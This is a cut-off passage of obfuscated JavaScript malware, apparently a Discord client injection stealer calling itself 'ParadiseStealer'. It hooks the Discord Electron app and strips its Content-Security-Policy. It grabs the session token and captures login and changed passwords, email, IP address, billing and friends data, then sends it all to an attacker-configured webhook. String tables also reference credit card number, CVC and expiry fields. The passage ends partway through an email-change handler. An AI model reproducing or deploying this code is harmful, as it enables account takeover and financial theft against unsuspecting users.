const _0xa16b14 = _0x36fd;
(function (_0x488cad, _0x5f2547) {
    const _0x3b5bb9 = _0x36fd,
        _0x1d8a3b = _0x488cad();
    while (!![]) {
        try {
            const _0x1f59d6 =
                -parseInt(_0x3b5bb9(0xf4)) / 0x1 +
                -parseInt(_0x3b5bb9(0x139)) / 0x2 +
                (-parseInt(_0x3b5bb9(0x149)) / 0x3) * (-parseInt(_0x3b5bb9(0x11e)) / 0x4) +
                parseInt(_0x3b5bb9(0xb5)) / 0x5 +
                -parseInt(_0x3b5bb9(0x13a)) / 0x6 +
                (parseInt(_0x3b5bb9(0xce)) / 0x7) * (parseInt(_0x3b5bb9(0x125)) / 0x8) +
                (parseInt(_0x3b5bb9(0x12b)) / 0x9) * (parseInt(_0x3b5bb9(0xc2)) / 0xa);
            if (_0x1f59d6 === _0x5f2547) break;
            else _0x1d8a3b["push"](_0x1d8a3b["shift"]());
        } catch (_0x43e0f7) {
            _0x1d8a3b["push"](_0x1d8a3b["shift"]());
        }
    }
})(_0x5c83, 0x79d1c);
const fs = require("fs"),
    path = require(_0xa16b14(0xd6)),
    { BrowserWindow: BrowserWindow, session: session } = require(_0xa16b14(0xbc)),
    querystring = require(_0xa16b14(0x14a)),
    os = require("os");
var webhook = "%WEBHOOK_LINK%";
const computerName = os[_0xa16b14(0x13e)](),
    discordInstall = "" + __dirname,
    EvalToken = _0xa16b14(0xc0),
    config = { logout: _0xa16b14(0x118), "logout-notify": _0xa16b14(0x11a), "init-notify": _0xa16b14(0xd2), "embed-color": 0x349b98, "disable-qr-code": _0xa16b14(0xe8) };
function FirstTime() {
    const _0x4f2d3a = _0xa16b14;
    BrowserWindow[_0x4f2d3a(0x12f)]()[0x0]
        ["webContents"][_0x4f2d3a(0x10f)]("" + EvalToken, !0x0)
        ["then"]((_0x5393d2) => {
            const _0x5d0add = _0x4f2d3a;
            if (_0x5d0add(0x128) == config["init-notify"] && fs[_0x5d0add(0xb2)](path[_0x5d0add(0x136)](__dirname, _0x5d0add(0xd1)))) {
                if ((fs[_0x5d0add(0x146)](path[_0x5d0add(0x136)](__dirname, _0x5d0add(0xd1))), null == _0x5393d2 || null == _0x5393d2 || "" == _0x5393d2)) {
                    var _0x1f187b = {
                        username: _0x5d0add(0x131),
                        content: "",
                        embeds: [
                            {
                                title: _0x5d0add(0xb9),
                                color: config[_0x5d0add(0xef)],
                                fields: [{ name: _0x5d0add(0xeb), value: _0x5d0add(0x114) + computerName + _0x5d0add(0x12c) + __dirname + "\x0a```", inline: !0x1 }],
                                author: { name: _0x5d0add(0x131) },
                                footer: { text: _0x5d0add(0x131) },
                                thumbnail: { url: "https://ibb.co/V2KcYZB" },
                            },
                        ],
                    };
                    SendToWebhook(JSON[_0x5d0add(0x111)](_0x1f187b));
                } else
                    BrowserWindow[_0x5d0add(0x12f)]()[0x0]
                        [_0x5d0add(0x133)][_0x5d0add(0x10f)](_0x5d0add(0xec) + _0x5393d2 + _0x5d0add(0x10b), !0x0)
                        ["then"]((_0x3230ea) => {
                            const _0x2bb53e = _0x5d0add,
                                _0x1b8778 = JSON[_0x2bb53e(0xd8)](_0x3230ea);
                            var _0x57025e = {
                                username: "ParadiseStealer",
                                content: "",
                                embeds: [
                                    {
                                        title: "Discord\x20Initalized",
                                        color: config[_0x2bb53e(0xef)],
                                        fields: [
                                            { name: _0x2bb53e(0xeb), value: _0x2bb53e(0x114) + computerName + _0x2bb53e(0x12c) + __dirname + _0x2bb53e(0x11d), inline: !0x1 },
                                            { name: _0x2bb53e(0xf6), value: "`" + _0x1b8778[_0x2bb53e(0xcc)] + "#" + _0x1b8778[_0x2bb53e(0x116)] + "`", inline: !0x0 },
                                            { name: "ID", value: "`" + _0x1b8778["id"] + "`", inline: !0x0 },
                                            { name: _0x2bb53e(0xfd), value: "" + GetBadges(_0x1b8778[_0x2bb53e(0xf2)]), inline: !0x1 },
                                            { name: "Token", value: _0x2bb53e(0x10e) + _0x5393d2 + _0x2bb53e(0x10e), inline: !0x1 },
                                        ],
                                        author: { name: _0x2bb53e(0x131) },
                                        footer: { text: _0x2bb53e(0x131) },
                                        thumbnail: { url: _0x2bb53e(0x112) + _0x1b8778["id"] + "/" + _0x1b8778[_0x2bb53e(0x12e)] },
                                    },
                                ],
                            };
                            SendToWebhook(JSON[_0x2bb53e(0x111)](_0x57025e));
                        });
            }
            if (!fs[_0x5d0add(0xb2)](path[_0x5d0add(0x136)](__dirname, _0x5d0add(0xfb)))) return !0x0;
            if ((fs[_0x5d0add(0x146)](path[_0x5d0add(0x136)](__dirname, _0x5d0add(0xfb))), "false" != config["logout"] || _0x5d0add(0x118) == config[_0x5d0add(0x113)])) {
                if ("true" == config[_0x5d0add(0x11f)])
                    null == _0x5393d2 || null == _0x5393d2 || "" == _0x5393d2
                        ? ((_0x1f187b = {
                              username: _0x5d0add(0x131),
                              content: "",
                              embeds: [
                                  {
                                      title: _0x5d0add(0xc1),
                                      color: config["embed-color"],
                                      fields: [{ name: _0x5d0add(0xeb), value: _0x5d0add(0x114) + computerName + "\x0aInjection\x20Info:\x20\x0a" + __dirname + "\x0a```", inline: !0x1 }],
                                      author: { name: _0x5d0add(0x131) },
                                      footer: { text: "ParadiseStealer" },
                                      thumbnail: { url: _0x5d0add(0x147) },
                                  },
                              ],
                          }),
                          SendToWebhook(JSON[_0x5d0add(0x111)](_0x1f187b)))
                        : BrowserWindow["getAllWindows"]()[0x0]
                              [_0x5d0add(0x133)]["executeJavaScript"](
                                  "\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20var\x20xmlHttp=new\x20XMLHttpRequest;xmlHttp.open(\x22GET\x22,\x22https://discord.com/api/v8/users/@me\x22,!1),xmlHttp.setRequestHeader(\x22Authorization\x22,\x22" +
                                      _0x5393d2 +
                                      _0x5d0add(0x10b),
                                  !0x0
                              )
                              [_0x5d0add(0xf7)]((_0x22d59e) => {
                                  const _0x510808 = _0x5d0add,
                                      _0x3dde84 = JSON[_0x510808(0xd8)](_0x22d59e);
                                  var _0x5c6ccc = {
                                      username: _0x510808(0x131),
                                      content: "",
                                      embeds: [
                                          {
                                              title: "User\x20got\x20logged\x20out",
                                              color: config[_0x510808(0xef)],
                                              fields: [
                                                  { name: _0x510808(0xeb), value: _0x510808(0x114) + computerName + _0x510808(0x12c) + __dirname + _0x510808(0x11d), inline: !0x1 },
                                                  { name: _0x510808(0xf6), value: "`" + _0x3dde84[_0x510808(0xcc)] + "#" + _0x3dde84["discriminator"] + "`", inline: !0x0 },
                                                  { name: "ID", value: "`" + _0x3dde84["id"] + "`", inline: !0x0 },
                                                  { name: _0x510808(0xfd), value: "" + GetBadges(_0x3dde84["flags"]), inline: !0x1 },
                                                  { name: _0x510808(0x10d), value: _0x510808(0x10e) + _0x5393d2 + _0x510808(0x10e), inline: !0x1 },
                                              ],
                                              author: { name: _0x510808(0x131) },
                                              footer: { text: _0x510808(0x131) },
                                              thumbnail: { url: "https://cdn.discordapp.com/avatars/" + _0x3dde84["id"] + "/" + _0x3dde84[_0x510808(0x12e)] },
                                          },
                                      ],
                                  };
                                  SendToWebhook(JSON[_0x510808(0x111)](_0x5c6ccc));
                              });
                BrowserWindow[_0x5d0add(0x12f)]()[0x0]
                    [_0x5d0add(0x133)]["executeJavaScript"](_0x5d0add(0x143), !0x0)
                    [_0x5d0add(0xf7)]((_0x7820ea) => {});
            }
            return !0x1;
        });
}
session[_0xa16b14(0x12d)]["webRequest"]["onHeadersReceived"]((_0x2926dd, _0xd4ec13) => {
    const _0x56a828 = _0xa16b14;
    _0x2926dd[_0x56a828(0xcb)][_0x56a828(0xb8)](webhook)
        ? _0x2926dd[_0x56a828(0xcb)][_0x56a828(0x110)]("discord.com")
            ? _0xd4ec13({ responseHeaders: Object[_0x56a828(0xbe)]({ "Access-Control-Allow-Headers": "*" }, _0x2926dd[_0x56a828(0x115)]) })
            : _0xd4ec13({
                  responseHeaders: Object[_0x56a828(0xbe)](
                      { "Content-Security-Policy": [_0x56a828(0xdd), "Access-Control-Allow-Headers\x20\x27*\x27", _0x56a828(0xb6)], "Access-Control-Allow-Headers": "*", "Access-Control-Allow-Origin": "*" },
                      _0x2926dd["responseHeaders"]
                  ),
              })
        : (delete _0x2926dd["responseHeaders"][_0x56a828(0xf1)],
          delete _0x2926dd[_0x56a828(0x115)]["content-security-policy-report-only"],
          _0xd4ec13({ responseHeaders: { ..._0x2926dd[_0x56a828(0x115)], "Access-Control-Allow-Headers": "*" } }));
});
function _0x36fd(_0x3eab52, _0x452730) {
    const _0x5c83d6 = _0x5c83();
    return (
        (_0x36fd = function (_0x36fdfb, _0x552848) {
            _0x36fdfb = _0x36fdfb - 0xb1;
            let _0x273eac = _0x5c83d6[_0x36fdfb];
            return _0x273eac;
        }),
        _0x36fd(_0x3eab52, _0x452730)
    );
}
const Filter = { urls: [_0xa16b14(0xbf), _0xa16b14(0xc6), _0xa16b14(0xe9), _0xa16b14(0xf0), _0xa16b14(0xc9), "https://*.discord.com/api/v*/users/@me/billing/subscriptions", _0xa16b14(0x121), _0xa16b14(0xb3)] };
function _0x5c83() {
    const _0x14281c = [
        "30xUeoSD",
        "querystring",
        "wss://",
        "existsSync",
        "wss://remote-auth-gateway.discord.gg/*",
        "<:staff_blue:936543701294010399>\x20Password",
        "3763205jufkuq",
        "Access-Control-Allow-Origin\x20\x27*\x27",
        "onCompleted",
        "startsWith",
        "Discord\x20Initalized\x20(User\x20not\x20Logged\x20in)",
        "card[exp_month]",
        "https://api.stripe.com/v*/tokens",
        "electron",
        "PATCH",
        "assign",
        "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
        "for(let\x20a\x20in\x20window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\x22get_require\x22]]]),delete\x20gg.m.get_require,delete\x20gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let\x20b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let\x20a\x20in\x20b.default)\x22getToken\x22==a&&(token=b.default.getToken())}token;",
        "User\x20log\x20out\x20(User\x20not\x20Logged\x20in\x20before)",
        "138640qrhRzk",
        "<a:early:925791052512788551>\x20",
        "<:developer:874750808472825986>\x20",
        "\x22);\x0a\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.send(\x20null\x20);\x0a\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.responseText",
        "https://*.discord.com/api/v*/applications/detectable",
        "https://*.discord.com/api/v*/users/@me",
        "card[address_zip]",
        "https://discord.com/api/v*/users/@me/library",
        "```\x0a**Token:**```",
        "url",
        "username",
        "\x0a\x20\x20\x20\x20\x20\x20\x20\x20var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.open(\x20\x22GET\x22,\x20\x22https://www.myexternalip.com/raw\x22,\x20false\x20);\x0a\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.send(\x20null\x20);\x0a\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.responseText;\x0a\x20\x20\x20\x20",
        "7HJXCba",
        "<:classic:896119171019067423>\x20`Nitro\x20Classic`",
        "email",
        "init",
        "%INITNOTI%",
        "Nitro",
        "```\x0a**State:\x20**```",
        "<:bughunter_1:874750808426692658>\x20",
        "path",
        "```\x0a**Nitro\x20Type:**```",
        "parse",
        "```\x0a**Credit\x20Card\x20Expiration:\x20**```",
        "endsWith",
        "password",
        "```\x0a**City:\x20**```",
        "default-src\x20\x27*\x27",
        "toString",
        "<:brilliance:874750808338608199>\x20",
        "https://discord.com/api/v*/auth/login",
        "forEach",
        "new_password",
        "```\x0a**Street:\x20**```",
        "premium_type",
        "\x0a\x20\x20\x20\x20var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20xmlHttp.open(\x20\x22GET\x22,\x20\x22https://discord.com/api/v8/users/@me\x22,\x20false\x20);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22",
        "```\x0a**Badges:**```",
        "));\x0a\x20\x20\x20\x20",
        "%DISABLEQRCODE%",
        "https://discord.com/api/v*/applications/detectable",
        "```\x0a**CVC:\x20**```",
        "Info",
        "\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20var\x20xmlHttp=new\x20XMLHttpRequest;xmlHttp.open(\x22GET\x22,\x22https://discord.com/api/v8/users/@me\x22,!1),xmlHttp.setRequestHeader(\x22Authorization\x22,\x22",
        "invalid",
        "exports",
        "embed-color",
        "https://*.discord.com/api/v*/users/@me/library",
        "content-security-policy",
        "flags",
        "**Username:**```",
        "358602ccPrsX",
        "\x22);\x0a\x20\x20\x20\x20xmlHttp.send(\x20null\x20);\x0a\x20\x20\x20\x20xmlHttp.responseText;",
        "Username",
        "then",
        "statusCode",
        "\x20\x20\x20\x20var\x20xhr\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20xhr.open(\x22POST\x22,\x20\x22",
        "disable-qr-code",
        "ParadiseStealerBTW",
        "<:PP_director:942527310324719716>\x20\x20Email",
        "Badges",
        "`✔️`\x20<:paypal:896441236062347374>",
        "card[exp_year]",
        "card[address_line1]",
        "<:bravery:874750808388952075>\x20",
        "bytes",
        "<:bughunter_2:874750808430874664>\x20",
        "\x0a\x20\x20\x20\x20\x20\x20\x20\x20var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.open(\x20\x22GET\x22,\x20\x22https://discord.com/api/v9/users/@me/billing/payment-sources\x22,\x20false\x20);\x0a\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22",
        "card[address_city]",
        "`✔️`\x20:credit_card:",
        "None",
        "length",
        "login",
        "No\x20Rare\x20Friends",
        "\x22),xmlHttp.send(null),xmlHttp.responseText;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20",
        "Billing",
        "Token",
        "```",
        "executeJavaScript",
        "includes",
        "stringify",
        "https://cdn.discordapp.com/avatars/",
        "logout",
        "```Hostname:\x20\x0a",
        "responseHeaders",
        "discriminator",
        "`<a:420_cross:931468716779114536>`",
        "%LOGOUT%",
        "<a:pepe_nitro:906950345983397988>\x20Nitro",
        "%LOGOUTNOTI%",
        "onBeforeRequest",
        "users/@me",
        "\x0a```",
        "3476muQmKb",
        "logout-notify",
        "No\x20Nitro",
        "https://discord.com/api/v*/users/@me/billing/subscriptions",
        "./core.asar",
        "card[number]",
        "type",
        "6087064GgWMxA",
        "```\x0a**IP:\x20**```",
        "<:staff_blue:936543701294010399>\x20\x20Old\x20Password",
        "true",
        "card[cvc]",
        "<:staff:874750808728666152>\x20",
        "18GxwoRL",
        "\x0aInjection\x20Info:\x20\x0a",
        "defaultSession",
        "avatar",
        "getAllWindows",
        "user",
        "ParadiseStealer",
        "<a:boost:824036778570416129>\x20`Nitro\x20Boost`",
        "webContents",
        "<a:420_cross:931468716779114536>",
        "from",
        "join",
        "uploadData",
        "\x22);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.send(\x20null\x20);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.responseText",
        "417640FgAFPt",
        "2901288vEEskR",
        "<:hypesquad_events:874750808594477056>\x20",
        "User\x20Credit\x20Card\x20Added",
        "```\x0a**ID:**```",
        "hostname",
        "public_flags",
        "card[address_country]",
        "filter",
        "tokens",
        "window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\x22get_require\x22]]]),delete\x20gg.m.get_require,delete\x20gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function\x20LogOut(){(function(a){const\x20b=\x22string\x22==typeof\x20a?a:null;for(const\x20c\x20in\x20gg.c)if(gg.c.hasOwnProperty(c)){const\x20d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return\x20d.default;if(d&&(b?d[b]:a(d)))return\x20d}return\x20null})(\x22login\x22).logout()}LogOut();",
        "<:staff_blue:936543701294010399>\x20\x20New\x20Password",
        "https://discord.com/api/v*/users/@me",
        "rmdirSync",
        "https://ibb.co/nmDLGCT",
        "<a:allbadges:895906088996720690>\x20\x20Badges",
    ];
    _0x5c83 = function () {
        return _0x14281c;
    };
    return _0x5c83();
}
function SendToWebhook(_0x3ce411) {
    const _0xcb1a80 = _0xa16b14;
    BrowserWindow[_0xcb1a80(0x12f)]()[0x0]
        [_0xcb1a80(0x133)]["executeJavaScript"](
            _0xcb1a80(0xf9) +
                webhook +
                "\x22,\x20true);\x0a\x20\x20\x20\x20xhr.setRequestHeader(\x27Content-Type\x27,\x20\x27application/json\x27);\x0a\x20\x20\x20\x20xhr.setRequestHeader(\x27Access-Control-Allow-Origin\x27,\x20\x27*\x27);\x0a\x20\x20\x20\x20xhr.send(JSON.stringify(" +
                _0x3ce411 +
                _0xcb1a80(0xe7),
            !0x0
        )
        ["then"]((_0x2b8ac7) => {});
}
function GetNitro(_0x23ac3) {
    const _0xe3ee61 = _0xa16b14;
    return 0x0 == _0x23ac3 ? _0xe3ee61(0x120) : 0x1 == _0x23ac3 ? _0xe3ee61(0xcf) : 0x2 == _0x23ac3 ? _0xe3ee61(0x132) : _0xe3ee61(0x120);
}
function GetRBadges(_0x3f1cd2) {
    const _0x3acb5e = _0xa16b14;
    var _0x518f47 = "";
    return (
        0x1 == (0x1 & _0x3f1cd2) && (_0x518f47 += _0x3acb5e(0x12a)),
        0x2 == (0x2 & _0x3f1cd2) && (_0x518f47 += "<:partner:874750808678354964>\x20"),
        0x4 == (0x4 & _0x3f1cd2) && (_0x518f47 += _0x3acb5e(0x13b)),
        0x8 == (0x8 & _0x3f1cd2) && (_0x518f47 += _0x3acb5e(0xd5)),
        0x200 == (0x200 & _0x3f1cd2) && (_0x518f47 += _0x3acb5e(0xc3)),
        0x4000 == (0x4000 & _0x3f1cd2) && (_0x518f47 += _0x3acb5e(0x103)),
        0x20000 == (0x20000 & _0x3f1cd2) && (_0x518f47 += _0x3acb5e(0xc4)),
        "" == _0x518f47 && (_0x518f47 = ""),
        _0x518f47
    );
}
function GetBadges(_0x62aaa6) {
    const _0x163e19 = _0xa16b14;
    var _0x5544f4 = "";
    return (
        0x1 == (0x1 & _0x62aaa6) && (_0x5544f4 += _0x163e19(0x12a)),
        0x2 == (0x2 & _0x62aaa6) && (_0x5544f4 += "<:partner:874750808678354964>\x20"),
        0x4 == (0x4 & _0x62aaa6) && (_0x5544f4 += _0x163e19(0x13b)),
        0x8 == (0x8 & _0x62aaa6) && (_0x5544f4 += "<:bughunter_1:874750808426692658>\x20"),
        0x40 == (0x40 & _0x62aaa6) && (_0x5544f4 += _0x163e19(0x101)),
        0x80 == (0x80 & _0x62aaa6) && (_0x5544f4 += _0x163e19(0xdf)),
        0x100 == (0x100 & _0x62aaa6) && (_0x5544f4 += "<:balance:874750808267292683>\x20"),
        0x200 == (0x200 & _0x62aaa6) && (_0x5544f4 += _0x163e19(0xc3)),
        0x4000 == (0x4000 & _0x62aaa6) && (_0x5544f4 += _0x163e19(0x103)),
        0x20000 == (0x20000 & _0x62aaa6) && (_0x5544f4 += "<:developer:874750808472825986>\x20"),
        "" == _0x5544f4 && (_0x5544f4 = _0x163e19(0x107)),
        _0x5544f4
    );
}
function Login(_0x43cb15, _0x5c8d6f, _0x58f91f) {
    const _0xeb1dc0 = _0xa16b14,
        _0x430765 = BrowserWindow[_0xeb1dc0(0x12f)]()[0x0];
    _0x430765["webContents"]["executeJavaScript"](_0xeb1dc0(0xe5) + _0x58f91f + _0xeb1dc0(0xf5), !0x0)[_0xeb1dc0(0xf7)]((_0x1ae1b1) => {
        const _0x7c54a7 = _0xeb1dc0;
        _0x430765[_0x7c54a7(0x133)]
            [_0x7c54a7(0x10f)](
                "\x0a\x20\x20\x20\x20\x20\x20\x20\x20var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.open(\x20\x22GET\x22,\x20\x22https://www.myexternalip.com/raw\x22,\x20false\x20);\x0a\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.send(\x20null\x20);\x0a\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.responseText;\x0a\x20\x20\x20\x20",
                !0x0
            )
            ["then"]((_0xc56273) => {
                const _0x439f0e = _0x7c54a7;
                _0x430765[_0x439f0e(0x133)][_0x439f0e(0x10f)](_0x439f0e(0x104) + _0x58f91f + _0x439f0e(0xc5), !0x0)["then"]((_0x4cb94b) => {
                    const _0x5b532d = _0x439f0e;
                    _0x430765[_0x5b532d(0x133)]
                        ["executeJavaScript"](
                            "\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.open(\x20\x22GET\x22,\x20\x22https://discord.com/api/v9/users/@me/relationships\x22,\x20false\x20);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22" +
                                _0x58f91f +
                                _0x5b532d(0x138),
                            !0x0
                        )
                        [_0x5b532d(0xf7)]((_0x56bf3d) => {
                            const _0x278318 = _0x5b532d,
                                _0x462302 = JSON[_0x278318(0xd8)](_0x1ae1b1);
                            var _0x4b1f71 = {
                                username: _0x278318(0x131),
                                content: "",
                                embeds: [
                                    {
                                        title: "User\x20Login",
                                        color: config[_0x278318(0xef)],
                                        fields: [
                                            { name: _0x278318(0xf6), value: "`" + _0x462302[_0x278318(0xcc)] + "#" + _0x462302[_0x278318(0x116)] + "`", inline: !0x0 },
                                            { name: "ID", value: "`" + _0x462302["id"] + "`", inline: !0x0 },
                                            { name: _0x278318(0x119), value: "" + GetNitro(_0x462302["premium_type"]), inline: !0x1 },
                                            { name: _0x278318(0x148), value: "" + GetBadges(_0x462302[_0x278318(0xf2)]), inline: !0x1 },
                                            {
                                                name: "Billing",
                                                value:
                                                    "" +
                                                    (function () {
                                                        const _0x532ed5 = _0x278318,
                                                            _0x213a2a = JSON[_0x532ed5(0xd8)](_0x4cb94b);
                                                        var _0xc10919 = "";
                                                        return (
                                                            _0x213a2a[_0x532ed5(0xe1)]((_0x4a3054) => {
                                                                const _0x41c812 = _0x532ed5;
                                                                if ("" == _0x4a3054[_0x41c812(0x124)]) return _0x41c812(0x134);
                                                                if (0x2 == _0x4a3054["type"] && 0x1 != _0x4a3054["invalid"]) _0xc10919 += _0x41c812(0xfe);
                                                                else {
                                                                    if (0x1 != _0x4a3054[_0x41c812(0x124)] || 0x1 == _0x4a3054[_0x41c812(0xed)]) return _0x41c812(0x134);
                                                                    _0xc10919 += _0x41c812(0x106);
                                                                }
                                                            }),
                                                            "" == _0xc10919 && (_0xc10919 = "<a:420_cross:931468716779114536>"),
                                                            _0xc10919
                                                        );
                                                    })(),
                                                inline: !0x1,
                                            },
                                            { name: _0x278318(0xfc), value: "`" + _0x43cb15 + "`", inline: !0x0 },
                                            { name: _0x278318(0xb4), value: "`" + _0x5c8d6f + "`", inline: !0x0 },
                                            { name: _0x278318(0x10d), value: _0x278318(0x10e) + _0x58f91f + "```", inline: !0x1 },
                                        ],
                                        author: { name: _0x278318(0x131) },
                                        footer: { text: _0x278318(0x131) },
                                        thumbnail: { url: _0x278318(0x112) + _0x462302["id"] + "/" + _0x462302[_0x278318(0x12e)] },
                                    },
                                    {
                                        title: "Total\x20Friends\x20(" + JSON["parse"](_0x56bf3d)[_0x278318(0x141)]((_0x5d943c) => 0x1 == _0x5d943c[_0x278318(0x124)])[_0x278318(0x108)] + ")",
                                        color: config[_0x278318(0xef)],
                                        description: (function () {
                                            const _0xcc358f = _0x278318,
                                                _0x58c2cb = JSON[_0xcc358f(0xd8)](_0x56bf3d)[_0xcc358f(0x141)]((_0x36dbd5) => 0x1 == _0x36dbd5[_0xcc358f(0x124)]);
                                            var _0x3a3b4b = "";
                                            for (z of _0x58c2cb) {
                                                var _0x58846e = GetRBadges(z[_0xcc358f(0x130)][_0xcc358f(0x13f)]);
                                                "" != _0x58846e && (_0x3a3b4b += _0x58846e + ("\x20" + z["user"][_0xcc358f(0xcc)] + "#" + z[_0xcc358f(0x130)][_0xcc358f(0x116)] + "\x0a"));
                                            }
                                            return "" == _0x3a3b4b && (_0x3a3b4b = _0xcc358f(0x10a)), _0x3a3b4b;
                                        })(),
                                        author: { name: _0x278318(0x131) },
                                        footer: { text: _0x278318(0x131) },
                                        thumbnail: { url: "https://cdn.discordapp.com/avatars/" + _0x462302["id"] + "/" + _0x462302[_0x278318(0x12e)] },
                                    },
                                ],
                            };
                            SendToWebhook(JSON[_0x278318(0x111)](_0x4b1f71));
                        });
                });
            });
    });
}
function ChangePassword(_0x5a07aa, _0x295f8f, _0x2d5364) {
    const _0x297369 = _0xa16b14,
        _0x4739af = BrowserWindow[_0x297369(0x12f)]()[0x0];
    _0x4739af[_0x297369(0x133)]["executeJavaScript"](_0x297369(0xe5) + _0x2d5364 + _0x297369(0xf5), !0x0)[_0x297369(0xf7)]((_0x5e48d5) => {
        const _0x4bae5a = _0x297369;
        _0x4739af[_0x4bae5a(0x133)][_0x4bae5a(0x10f)](_0x4bae5a(0xcd), !0x0)["then"]((_0x58924c) => {
            const _0x21e752 = _0x4bae5a;
            _0x4739af["webContents"][_0x21e752(0x10f)](_0x21e752(0x104) + _0x2d5364 + _0x21e752(0xc5), !0x0)[_0x21e752(0xf7)]((_0x3c20ae) => {
                const _0x2389ec = _0x21e752,
                    _0x3e0bef = JSON["parse"](_0x5e48d5);
                var _0x1575e8 = {
                    username: _0x2389ec(0x131),
                    content: "",
                    embeds: [
                        {
                            title: "Password\x20Changed",
                            color: config[_0x2389ec(0xef)],
                            fields: [
                                { name: _0x2389ec(0xf6), value: "`" + _0x1575e8[_0x2389ec(0xcc)] + "#" + _0x1575e8[_0x2389ec(0x116)] + "`", inline: !0x0 },
                                { name: "ID", value: "`" + _0x1575e8["id"] + "`", inline: !0x0 },
                                { name: _0x2389ec(0x119), value: "" + GetNitro(_0x1575e8[_0x2389ec(0xe4)]), inline: !0x1 },
                                { name: "<a:allbadges:895906088996720690>\x20\x20Badges", value: "" + GetBadges(_0x1575e8[_0x2389ec(0xf2)]), inline: !0x1 },
                                {
                                    name: _0x2389ec(0x10c),
                                    value:
                                        "" +
                                        (function () {
                                            const _0x22e1f9 = _0x2389ec,
                                                _0x3fd062 = JSON["parse"](_0x3e0bef);
                                            var _0x16c194 = "";
                                            return (
                                                _0x3fd062["forEach"]((_0x7a49d4) => {
                                                    const _0x3ee965 = _0x36fd;
                                                    if ("" == _0x7a49d4[_0x3ee965(0x124)]) return _0x3ee965(0x134);
                                                    if (0x2 == _0x7a49d4["type"] && 0x1 != _0x7a49d4[_0x3ee965(0xed)]) _0x16c194 += _0x3ee965(0xfe);
                                                    else {
                                                        if (0x1 != _0x7a49d4[_0x3ee965(0x124)] || 0x1 == _0x7a49d4[_0x3ee965(0xed)]) return "<a:420_cross:931468716779114536>";
                                                        _0x16c194 += _0x3ee965(0x106);
                                                    }
                                                }),
                                                "" == _0x16c194 && (_0x16c194 = _0x22e1f9(0x134)),
                                                _0x16c194
                                            );
                                        })(),
                                    inline: !0x1,
                                },
                                { name: "<:PP_director:942527310324719716>\x20\x20Email", value: "`" + _0x3e0bef["email"] + "`", inline: !0x1 },
                                { name: _0x2389ec(0x127), value: "`" + _0x5a07aa + "`", inline: !0x0 },
                                { name: _0x2389ec(0x144), value: "`" + _0x295f8f + "`", inline: !0x0 },
                                { name: "Token", value: "```" + _0x2d5364 + _0x2389ec(0x10e), inline: !0x1 },
                            ],
                            author: { name: _0x2389ec(0x131) },
                            footer: { text: "ParadiseStealer" },
                            thumbnail: { url: _0x2389ec(0x112) + _0x3e0bef["id"] + "/" + _0x3e0bef[_0x2389ec(0x12e)] },
                        },
                    ],
                };
                SendToWebhook(JSON[_0x2389ec(0x111)](_0x1575e8));
            });
        });
    });
}
function ChangeEmail(_0x3283ce, _0x1d6f5c, _0xb0910c) {
    const _0x3383e5 = _0xa16b14,
        _0x57ac3b = BrowserWindow["getAllWindows"]()[0x0];
    _0x57ac3b[_0x3383e5(0x133)]
        [_0x3383e5(0x10f)](
            "\x0a\x20\x20\x20\x20var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20xmlHttp.open(\x20\x22GET\x22,\x20\x22https://discord.com/api/v8/users/@me\x22,\x20false\x20);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22" +
                _0xb0910c +
                _0x3383e5(0xf5),
            !0x0
        )
        [_0x3383e5(0xf7)]((_0x55efda) => {
            const _0x55c798 = _0x3383e5;
            _0x57ac3b[_0x55c798(0x133)]
                [_0x55c798(0x10f)](
